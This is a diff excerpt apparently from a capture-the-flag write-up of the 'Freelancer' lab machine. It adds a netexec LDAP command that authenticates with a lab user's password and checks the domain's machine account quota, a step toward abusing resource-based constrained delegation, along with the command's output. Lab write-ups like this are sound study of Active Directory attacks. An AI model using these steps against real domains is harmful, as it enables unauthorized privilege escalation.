@@ -682,7 +682,19 @@ I also had write to the key credentials link, but after trying to apply shadow c
 
 But i can abuse this using RBCD
 
+```python
+nxc ldap dc.freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199' -M maq
+LDAP        10.129.66.164   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:freelancer.htb) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.66.164   389    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 
+MAQ         10.129.66.164   389    DC               [*] Getting the MachineAccountQuota
+MAQ         10.129.66.164   389    DC               MachineAccountQuota: 10
+```
 
+Checking the machine account quota, i see its set to 10, so that makes this even easier
+
+```python
+
+```
 
 
 
